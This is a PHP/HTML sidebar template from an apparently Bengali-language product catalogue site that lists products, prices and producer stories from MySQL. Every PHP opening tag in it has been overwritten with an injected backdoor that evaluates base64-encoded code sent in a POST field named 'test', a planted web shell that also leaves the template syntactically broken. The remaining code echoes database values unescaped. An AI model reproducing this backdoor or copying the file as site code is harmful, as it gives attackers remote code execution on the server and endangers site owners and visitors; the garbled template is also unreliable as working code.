<table width="226" cellspacing="0" cellpadding="0">
  <tr>
    <td><img src="images/sme_inner_09.jpg" alt="" width="226" height="36" /></td>
  </tr>
  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
		$sql=mysql_query("SELECT * FROM omp WHERE Status!=1 LIMIT 0,8");
		while ($dtProd=mysql_fetch_array($sql)) 
		{
	?>
  <tr>
    <td><table width="174" cellspacing="0" cellpadding="0">
      <tr>
        <td><div align="right"><a class="menu-link" href="ProductDetails.php?ProductId=<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['ProductId'];?>">
            <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Product'];?>
        </a></div></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td><img src="images/sme_inner_15.jpg" width="226" height="15" /></td>
  </tr>
  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} } ?>
  <tr>
    <td><img src="images/sme_inner_19.jpg" width="226" height="52" /></td>
  </tr>
  <tr>
    <td><table width="175" border="0" align="center" cellpadding="0" cellspacing="0">
      <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
				//echo "SELECT * FROM omp WHERE Status!=1"; exit;
				$sql=mysql_query("SELECT * FROM omp WHERE Status=3 ORDER BY ProductId DESC");
				$dtProd=mysql_fetch_array($sql);
			?>
      <tr>
        <td><img src="Thumbnail/<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Photo'];?>" align="left" hspace="3" vspace="2" border="0" width="70" height="70" />
            <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Product'];?>
          ,&nbsp;
          <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=substr($dtProd['Details'],0,300);?>
          <a class="menu-link" href="ProductDetails.php?ProductId=<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['ProductId'];?>">...বিস্তারিত</a> <br />
          মূল্য:
          <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Cost'];?>        </td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td><img src="images/sme_inner_23.jpg" width="226" height="19" /></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td><img src="images/sme_inner_26.jpg" width="226" height="22" /></td>
  </tr>
  <tr>
    <td><table width="175" border="0" align="center" cellpadding="0" cellspacing="0">
      <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
				//echo "SELECT * FROM producer WHERE Status=3 ORDER BY ProducerId DESC"; exit;
				$sqlProducer=mysql_query("SELECT * FROM producer WHERE Status=3 ORDER BY ProducerId DESC");
				$dtProducer=mysql_fetch_array($sqlProducer);
			?>
      <tr>
        <td><div align="left"> <img src="Thumbnail/<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProducer['Photo'];?>" align="left" hspace="2" vspace="3" border="0" width="70" height="70" />
                <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProducer['Producer'];?>
          ,&nbsp;
          <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=substr($dtProducer['Story'],0,300);?>
          <a class="menu-link" href="ProducerDetails.php?ProducerId=<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProducer['ProducerId'];?>">...বিস্তারিত</a> </div></td>
      </tr>
      <tr>
        <td align="center"><img src="images/trans.gif" width="10" height="7" /></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td><img src="images/sme_inner_28.jpg" width="226" height="15" /></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
  </tr>
</table>